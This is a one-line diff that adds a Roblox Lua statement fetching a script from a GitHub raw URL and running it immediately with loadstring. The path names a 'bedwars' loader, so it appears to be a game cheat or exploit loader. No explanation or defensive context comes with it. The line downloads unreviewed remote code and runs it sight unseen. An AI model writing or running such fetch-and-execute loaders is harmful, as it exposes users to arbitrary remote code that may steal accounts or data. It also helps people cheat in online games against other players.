@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/bedwars-halloween-pt-1-spam5-35ypn2cxh0stjn.lua"))()
